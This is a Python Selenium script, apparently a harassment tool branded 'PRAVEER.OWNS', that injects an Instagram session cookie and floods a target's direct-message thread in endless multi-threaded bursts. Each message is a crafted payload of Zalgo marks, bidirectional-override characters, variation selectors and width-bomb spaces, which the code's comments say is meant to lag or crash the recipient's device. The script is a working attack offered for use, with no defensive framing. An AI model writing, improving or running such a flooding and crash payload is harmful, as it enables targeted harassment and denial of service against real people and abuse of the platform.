# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-STOP FINAL)
# 📅 STATUS: DENSITY x80 | TRIPLE-BURST | GOTHIC AESTHETIC

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "GLOBAL")

def get_kernel_stop_payload(target_name):
    """The PRAVEER.OWNS Edition: High-style, High-lag."""
    u_id = random.randint(1000, 9999)
    
    # 💥 STYLIZED HEADER (Mathematical Fractur/Bold)
    header = (
        f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n"
        f"『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』\n"
        f"🆔 𝖀𝕴𝕯-{MACHINE_ID}-{u_id}\n"
    )
    
    # 💥 THE 'SHAPE-SHIFTER' (Plane-14 + Plane-1 Mix)
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(400))
    
    # 💥 DENSITY x80 (800 Zalgo marks) - Vertical Skyscraper
    z_tower = "̸" * 800
    
    # 💥 THE 'WIDTH-BOMB' (Non-breaking spaces)
    width_bomb = "\u2800\u00A0" * 200

    lines = [header, shifter, width_bomb]
    for i in range(42):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=4))
        # Stylizing vowels to hit different font tables
        styled_target = target_name.upper().replace('A', '𝕬').replace('E', '𝕰').replace('I', '𝕴').replace('O', '𝕺').replace('U', '𝖀')
        lines.append(f"{width_bomb}{prefix}{styled_target}_{noise}{z_tower}{shifter}")
    
    return "\n".join(lines)[:10000]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Rotating User-Agents for 2026 compatibility
    ver = random.randint(122, 126)
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie, target_id, target_name):
    while True: # Auto-Reconnect Loop
        driver = None
        strike_count = 0
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(10)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            while True:
                # 🔥 TRIPLE-BURST WAVE
                for _ in range(3):
                    try:
                        box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                        payload = get_kernel_stop_payload(target_name)
                        
                        driver.execute_script("""
                            var box = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            box.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        
                        box.send_keys(Keys.ENTER)
                        strike_count += 1
                        print(f"💀 [M{MACHINE_ID}-A{agent_id}] STRIKE {strike_count}", flush=True)
                        
                        # Stop rendering to keep bot fast
                        driver.execute_script("window.stop();")
                        time.sleep(0.01)
                    except: break

                # Short jitter to saturate target RAM
                time.sleep(random.uniform(0.6, 1.2))
                
                # Prevent bot-side lag
                if strike_count % 18 == 0:
                    driver.refresh()
                    time.sleep(8)

        except Exception as e:
            if driver: driver.quit()
            time.sleep(10)
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
